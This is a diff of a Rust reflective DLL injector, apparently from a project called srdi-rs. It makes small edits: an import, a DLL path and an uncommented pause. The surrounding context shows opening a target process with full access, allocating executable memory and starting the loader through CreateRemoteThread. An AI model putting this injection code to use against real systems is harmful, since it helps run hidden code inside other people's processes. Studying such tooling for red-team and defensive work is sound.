@@ -1,7 +1,7 @@
 use std::{ptr::null_mut, collections::BTreeMap, ffi::CStr};
 
 use sysinfo::{Pid, SystemExt, ProcessExt};
-use winapi::um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER}, memoryapi::{VirtualAllocEx, WriteProcessMemory}, handleapi::CloseHandle, synchapi::WaitForSingleObject};
+use winapi::um::{processthreadsapi::{OpenProcess, CreateRemoteThread}, winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS64, PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER}, memoryapi::{VirtualAllocEx, WriteProcessMemory}, handleapi::CloseHandle};
 
 fn main() {
     env_logger::init();
@@ -9,7 +9,7 @@ fn main() {
     log::info!("[+] Process ID: {:}", process_id);
 
     // Start madness
-    let dll_bytes = include_bytes!("C:\\Users\\User\\Documents\\GitHub\\srdi-rs\\reflective_loader\\target\\debug\\reflective_loader.dll");
+    let dll_bytes = include_bytes!("X:\\srdi-rs\\reflective_loader\\target\\debug\\reflective_loader.dll");
     
     let module_base = dll_bytes.as_ptr() as usize;
     let dos_header = module_base as PIMAGE_DOS_HEADER;
@@ -74,7 +74,7 @@ fn main() {
 
     let reflective_loader = remote_image as usize + (loader_address as usize - module_base); // module_base minus to get the offset
     log::info!("[+] Remote Reflective Loader Address/offset: {:#x}", reflective_loader);
-    //pause();
+    pause();
 
     // Create remote thread and execute our shellcode
     let thread_handle = unsafe { 
